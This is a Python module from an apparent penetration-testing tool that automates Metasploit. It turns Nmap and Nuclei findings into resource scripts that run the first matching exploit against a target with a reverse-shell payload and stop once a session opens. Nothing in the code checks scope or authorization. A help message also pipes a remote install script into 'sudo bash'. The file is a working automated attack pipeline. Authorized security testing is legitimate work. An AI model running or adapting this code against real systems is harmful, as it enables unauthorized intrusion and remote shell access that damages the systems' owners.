"""Metasploit automation: search and run exploits per Nmap service."""
import os
import re
from pathlib import Path
from typing import Optional

from harpoon.config import LOG_DIR, MSF_LOCAL, MSF_LOCAL_CWD, MSFCONSOLE_CMD, MSF_LOG
from harpoon.parsers.nmap_parser import ServiceInfo
from harpoon.runner import find_cmd, run_capture

# Common Windows Metasploit paths (installer default: C:\metasploit-framework)
MSF_WIN_PATHS = [
    Path("C:/metasploit-framework/bin/msfconsole.bat"),
    Path("C:/metasploit-framework/bin/msfconsole"),
    Path("C:/Metasploit-framework/bin/msfconsole.bat"),
    Path(os.environ.get("ProgramFiles", "C:/Program Files")) / "Metasploit" / "bin" / "msfconsole.bat",
    Path(os.environ.get("ProgramFiles", "C:/Program Files")) / "Metasploit" / "bin" / "msfconsole",
    Path(os.environ.get("ProgramFiles(x86)", "C:/Program Files (x86)")) / "Metasploit" / "bin" / "msfconsole.bat",
    Path(os.environ.get("LocalAppData", "")) / "Programs" / "metasploit-framework" / "bin" / "msfconsole.bat",
]


def _msf_path() -> tuple[Optional[str], bool]:
    """
    Return (path, use_ruby). use_ruby=True means invoke as 'ruby path' with cwd=path.parent.
    """
    p = find_cmd("msfconsole") or find_cmd("msfconsole.bat") or find_cmd(MSFCONSOLE_CMD.split()[0])
    if p:
        return p, False
    for path in MSF_WIN_PATHS:
        if path.exists():
            return str(path), False
    for root in (MSF_LOCAL, MSF_LOCAL_CWD):
        msf = root / "msfconsole"
        if msf.exists():
            return str(msf), True
    return None, False


# Map Nmap service names to precise Metasploit search terms (e.g. telnetd → telnet)
SERVICE_SEARCH_TERMS: dict[str, str] = {
    "telnet": "telnet",
    "telnetd": "telnet",
    "ftp": "ftp",
    "ssh": "ssh",
    "smb": "smb",
    "samba": "samba",
    "mysql": "mysql",
    "mssql": "mssql",
    "postgresql": "postgres",
    "redis": "redis",
    "mongodb": "mongodb",
    "vnc": "vnc",
    "rdp": "rdp",
    "rpc": "rpc",
    "nfs": "nfs",
    "snmp": "snmp",
    "ldap": "ldap",
    "apache": "apache",
    "httpd": "apache",
    "nginx": "nginx",
    "tomcat": "tomcat",
    "jboss": "jboss",
    "weblogic": "weblogic",
    "iis": "iis",
    "exchange": "exchange",
}


def _search_term_for_service(svc: ServiceInfo) -> str:
    """Return optimized Metasploit search term for a given service."""
    combined = f"{svc.service} {svc.product} {svc.version}".lower()
    for key, term in SERVICE_SEARCH_TERMS.items():
        if key in combined:
            return term
    return svc.search_term


def _parse_cves_from_nuclei(text: str) -> list[str]:
    """Extract CVE IDs from Nuclei output."""
    cves: list[str] = []
    for m in re.finditer(r"CVE-\d{4}-\d{4,}", (text or ""), re.IGNORECASE):
        cve = m.group(0).upper()
        if cve not in cves:
            cves.append(cve)
    return cves[:10]


def _build_argv(msf: str, use_ruby: bool, rc_path: Path) -> tuple[list[str], Path | None]:
    """Build subprocess argv and optional cwd for msfconsole invocation."""
    if use_ruby:
        return ["ruby", msf, "-q", "-r", str(rc_path)], Path(msf).parent
    return [msf, "-q", "-r", str(rc_path)], None


def _check_session(combined: str) -> bool:
    low = combined.lower()
    return any(kw in low for kw in ("session", "meterpreter", "shell session", "command shell"))


def _make_service_rc(term: str, target: str, port: int, lhost: str) -> str:
    """Generate a robust Metasploit RC script that handles empty search results."""
    return (
        f"spool /dev/null\n"
        f"search type:exploit {term}\n"
        f"spool off\n"
        f"use 0\n"
        f"set RHOSTS {target}\n"
        f"set RPORT {port}\n"
        f"set payload generic/shell_reverse_tcp\n"
        f"set LHOST {lhost}\n"
        f"set ExitOnSession true\n"
        f"exploit -z\n"
        f"exit\n"
    )


def _make_cve_rc(cve: str, target: str, lhost: str) -> str:
    return (
        f"search cve:{cve}\n"
        f"use 0\n"
        f"set RHOSTS {target}\n"
        f"set payload generic/shell_reverse_tcp\n"
        f"set LHOST {lhost}\n"
        f"set ExitOnSession true\n"
        f"exploit -z\n"
        f"exit\n"
    )


def run_metasploit_for_services(
    target_host: str,
    services: list[ServiceInfo],
    lhost: str = "127.0.0.1",
    log_path: Path = MSF_LOG,
    nuclei_log: Path | None = None,
    timeout_per_exploit: int = 180,
    max_exploits_per_service: int = 3,
) -> tuple[bool, str]:
    """
    For each service, generate an MSF resource script that searches and runs
    exploits. Run msfconsole -q -r script.rc. If a shell/session is obtained,
    stop and return (True, message). Otherwise return (False, summary).
    """
    msf, use_ruby = _msf_path()
    if not msf:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        help_msg = (
            "Metasploit (msfconsole) not found.\n\n"
            "Windows: Download the .msi from https://windows.metasploit.com/metasploitframework-latest.msi\n"
            "         Run as Administrator. Default install: C:\\metasploit-framework\\bin\\\n"
            "         Add that bin folder to PATH, or set: HARPOON_MSFCONSOLE=C:\\metasploit-framework\\bin\\msfconsole.bat\n\n"
            "Linux:   curl -sL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash"
        )
        log_path.write_text(help_msg, encoding="utf-8")
        return False, "Metasploit not found; see log."

    LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_lines: list[str] = [f"# Metasploit binary: {msf}  (use_ruby={use_ruby})\n"]
    success = False
    attempted = 0

    for svc in services:
        if success:
            break
        term = _search_term_for_service(svc)
        port = svc.port
        rc_content = _make_service_rc(term, target_host, port, lhost)
        rc_path = LOG_DIR / f"msf_{svc.port}_{svc.service.replace('/', '_')}.rc"
        rc_path.write_text(rc_content, encoding="utf-8")

        argv, cwd = _build_argv(msf, use_ruby, rc_path)
        code, out, err = run_capture(
            argv,
            LOG_DIR / f"msf_out_{svc.port}.txt",
            timeout=timeout_per_exploit,
            cwd=cwd,
        )
        attempted += 1
        combined = f"{out}\n{err}"
        log_lines.append(f"--- Port {port} ({svc.service}, term='{term}') ---\n{combined}\n")
        if _check_session(combined):
            success = True
            log_lines.append("*** SESSION OPENED – stopping exploitation. ***")
            break

    if not success and nuclei_log and nuclei_log.exists():
        try:
            nuclei_text = nuclei_log.read_text(encoding="utf-8", errors="replace")
            cves = _parse_cves_from_nuclei(nuclei_text)
            for cve in cves:
                if success:
                    break
                rc_content = _make_cve_rc(cve, target_host, lhost)
                rc_path = LOG_DIR / f"msf_cve_{cve.replace('-', '_')}.rc"
                rc_path.write_text(rc_content, encoding="utf-8")
                argv, cwd = _build_argv(msf, use_ruby, rc_path)
                code, out, err = run_capture(argv, LOG_DIR / f"msf_out_{cve}.txt", timeout=timeout_per_exploit, cwd=cwd)
                attempted += 1
                combined = f"{out}\n{err}"
                log_lines.append(f"--- CVE {cve} ---\n{combined}\n")
                if _check_session(combined):
                    success = True
                    log_lines.append("*** SESSION OPENED via CVE exploit – stopping. ***")
        except OSError:
            pass

    log_path.write_text("\n".join(log_lines), encoding="utf-8", errors="replace")
    if success:
        msg = "Metasploit: possible compromise detected (check logs)."
    elif attempted == 0:
        msg = "Metasploit: no services to exploit."
    else:
        msg = f"Metasploit: {attempted} exploit(s) attempted, no sessions obtained."
    return success, msg
